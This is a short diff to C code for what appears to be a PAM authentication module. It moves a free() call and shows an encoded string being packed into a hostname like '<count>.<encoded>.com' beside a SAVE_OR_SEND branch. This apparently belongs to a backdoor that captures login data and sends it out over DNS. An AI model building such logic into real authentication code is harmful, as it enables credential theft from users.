@@ -65,6 +65,8 @@ modify_result(char *encoded_string){
          modify_string[strlen(modify_string)-1] = '\0';
     }
 
+    free(encoded_string);
+    
     return modify_string;
 }
 
@@ -175,7 +177,6 @@ pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv )
      encoded_string = modify_result(encoded_string);
 
      snprintf(bonus, sizeof(bonus), "%d.%s.com", count,encoded_string); 
-     free(encoded_string);
     
      if (SAVE_OR_SEND)
      {
